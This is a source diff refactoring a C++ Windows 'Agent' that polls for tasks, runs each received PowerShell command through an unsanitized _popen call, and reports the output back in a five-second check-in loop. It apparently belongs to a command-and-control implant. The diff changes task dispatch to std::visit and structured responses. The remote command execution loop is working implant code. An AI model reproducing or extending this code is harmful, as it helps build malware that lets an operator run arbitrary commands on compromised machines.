@@ -3,6 +3,7 @@
 #define _WIN32_WINNT 0x0600
 
 #include "Agent.h"
+
 #include <stdio.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
@@ -15,10 +16,14 @@
 #include <array>
 #include <cmath>
 #include <cstdio>
+#include <variant>
 
 #pragma comment(lib, "psapi.lib")
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "ws2_32.lib")
+
+template<class... Ts> struct overloaded : Ts... { using Ts::operator()...; };
+template<class... Ts> overloaded(Ts...) -> overloaded<Ts...>;
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
 // Default constructor
@@ -47,15 +52,15 @@ void Agent::Start()
 
         if (taskManager.HasPendingTask())
         {
-            CheckinResponse task = taskManager.GetNextTask();
-            std::string result;
-            switch (task.type)
-            {
-            case 1:
-                result = ExecutePowerShell(task.powerShellCommand.commandlet);
-                taskManager.StoreTaskResult(task.id, true, result);
-                break;
-            }
+            auto request = taskManager.GetNextTask();
+
+            Response result = std::visit(overloaded{
+                [this](const TaskRequest<CommandPowershell>& psRequest) -> Response {
+                    return ExecutePowerShell(psRequest);
+                },
+            }, request);
+
+            taskManager.StoreTaskResult(result);
         }
         Sleep(5000);
     }
@@ -81,16 +86,14 @@ std::string Agent::GetUID() {
     return std::string();
 }
 
-std::string Agent::ExecutePowerShell(const std::string& command)
+Response Agent::ExecutePowerShell(const TaskRequest<CommandPowershell>& psRequest)
 {
-#ifdef _WIN32
-    // Execute PowerShell command and return the output
     std::string result;
-    std::string psCommand = "powershell.exe -Command \"" + command + "\"";
+    std::string psCommand = "powershell.exe -Command \"" + psRequest.data.commandlet + "\"";
     FILE* pipe = _popen(psCommand.c_str(), "r");
     if (!pipe)
     {
-        return "Error executing PowerShell command.";
+        return CreateTaskResponse(psRequest.taskID, psRequest.type, 500, 0, TaskError{ 500, "Failed to open process pipe." });
     }
 
     char buffer[128];
@@ -102,11 +105,7 @@ std::string Agent::ExecutePowerShell(const std::string& command)
 
     _pclose(pipe);
 
-    return result;
-#else
-    (void)command; // Suppress unused parameter warning
-    return "PowerShell execution is only supported on Windows.";
-#endif
+    return CreateTaskResponse(psRequest.taskID, psRequest.type, 0, 0, TaskSuccess{ result });
 }
 
 
